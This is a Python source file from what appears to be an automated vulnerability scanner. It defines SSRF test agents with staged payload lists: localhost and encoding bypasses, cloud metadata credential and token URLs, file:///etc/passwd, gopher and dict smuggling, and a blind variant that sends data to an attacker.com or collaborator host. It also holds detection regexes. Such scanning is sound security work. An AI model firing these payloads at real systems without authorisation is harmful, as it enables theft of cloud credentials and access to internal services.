"""Server-Side Request Forgery Agent - CWE-918."""

import re
from typing import Dict, List, Pattern

from ..base import BaseAgent, PayloadStage


class SSRFAgent(BaseAgent):
    """
    Server-Side Request Forgery (SSRF) testing agent.

    Tests for SSRF vulnerabilities including:
    - Basic internal network access
    - Cloud metadata endpoints
    - Protocol smuggling
    - DNS rebinding indicators

    Payloads derived from ZAP's SsrfScanRule.java
    """

    @property
    def vulnerability_type(self) -> str:
        return "ssrf"

    @property
    def cweid(self) -> int:
        return 918

    @property
    def priority(self) -> int:
        return 8  # High priority - can access internal systems

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        return {
            PayloadStage.PROBE: [
                # Localhost variations
                "http://localhost",
                "http://127.0.0.1",
                "http://[::1]",
                "http://0.0.0.0",
                "http://127.1",
                "http://127.0.1",
                # DNS names
                "http://localhost.localdomain",
                "http://localtest.me",
                # Common ports
                "http://127.0.0.1:80",
                "http://127.0.0.1:443",
                "http://127.0.0.1:22",
                "http://127.0.0.1:3306",
            ],
            PayloadStage.CONFIRM: [
                # Cloud metadata endpoints
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                # Internal services
                "http://127.0.0.1:6379",  # Redis
                "http://127.0.0.1:11211",  # Memcached
                "http://127.0.0.1:27017",  # MongoDB
                "http://127.0.0.1:9200",  # Elasticsearch
                "http://127.0.0.1:8080",  # Common app server
                # File protocol
                "file:///etc/passwd",
                "file:///c:/windows/win.ini",
            ],
            PayloadStage.EXPLOIT: [
                # AWS metadata
                "http://169.254.169.254/latest/meta-data/hostname",
                "http://169.254.169.254/latest/meta-data/local-ipv4",
                "http://169.254.169.254/latest/user-data",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                # GCP metadata
                "http://metadata.google.internal/computeMetadata/v1/project/project-id",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                # Azure metadata
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                # Docker/Kubernetes
                "http://127.0.0.1:2375/info",
                "http://127.0.0.1:10250/pods",
                "http://kubernetes.default.svc",
            ],
            PayloadStage.BYPASS: [
                # IP obfuscation
                "http://0x7f.0x0.0x0.0x1",  # Hex
                "http://2130706433",  # Decimal
                "http://017700000001",  # Octal
                "http://127.0.0.1.nip.io",  # DNS rebinding
                "http://127.0.0.1.xip.io",
                # URL encoding
                "http://%31%32%37%2e%30%2e%30%2e%31",
                # Double URL encoding
                "http://%2531%2532%2537%252e%2530%252e%2530%252e%2531",
                # CRLF injection
                "http://127.0.0.1%0d%0aHost:%20attacker.com",
                # @ symbol abuse
                "http://attacker.com@127.0.0.1",
                # IPv6 variations
                "http://[0:0:0:0:0:ffff:127.0.0.1]",
                "http://[::ffff:127.0.0.1]",
                # Short URL
                "http://①②⑦.⓪.⓪.①",  # Unicode
                # Protocol variations
                "gopher://127.0.0.1:6379/_GET%20key",
                "dict://127.0.0.1:6379/info",
            ],
        }

    def get_detection_patterns(self) -> List[Pattern]:
        """Return patterns that indicate SSRF vulnerability."""
        patterns = [
            # AWS metadata
            r"ami-[0-9a-f]+",
            r"i-[0-9a-f]+",
            r"instance-id",
            r"local-ipv4",
            r"security-credentials",
            r"iam.*role",
            # GCP metadata
            r"project-id",
            r"instance/zone",
            r"service-accounts",
            r"access_token.*token_type",
            # Azure metadata
            r"subscriptionId",
            r"resourceGroupName",
            r"vmId",
            # Internal service responses
            r"Redis Version|redis_version",
            r"MEMCACHED|memcached",
            r"MongoDB|mongo",
            r"elasticsearch|lucene_version",
            # File content
            r"root:.*:0:0:",
            r"\[fonts\]",
            # Docker
            r"ContainersRunning|DockerRootDir",
            r"container_id",
            # Kubernetes
            r"kubernetes\.io",
            r"kube-system",
            # Network info
            r"inet\s+10\.",
            r"inet\s+192\.168\.",
            r"inet\s+172\.(1[6-9]|2[0-9]|3[0-1])\.",
            # Error messages indicating SSRF
            r"couldn't connect to host",
            r"connection refused",
            r"no route to host",
            r"network is unreachable",
        ]
        return [re.compile(p, re.IGNORECASE) for p in patterns]


class SSRFBlindAgent(SSRFAgent):
    """Specialized agent for blind SSRF using out-of-band techniques."""

    @property
    def vulnerability_type(self) -> str:
        return "ssrf_blind"

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        # For blind SSRF, we'd need a callback server
        # Using placeholder domain that would be replaced with actual collaborator
        return {
            PayloadStage.PROBE: [
                "http://COLLABORATOR_DOMAIN/ssrf-probe",
                "http://COLLABORATOR_DOMAIN:80/",
                "https://COLLABORATOR_DOMAIN/",
            ],
            PayloadStage.CONFIRM: [
                "http://COLLABORATOR_DOMAIN/ssrf-confirm-{UUID}",
                "https://COLLABORATOR_DOMAIN/ssrf-confirm-{UUID}",
            ],
            PayloadStage.EXPLOIT: [
                "http://COLLABORATOR_DOMAIN/{DATA}",
            ],
            PayloadStage.BYPASS: [
                "http://COLLABORATOR_DOMAIN.attacker.com/",
                "http://attacker.com#@COLLABORATOR_DOMAIN/",
            ],
        }
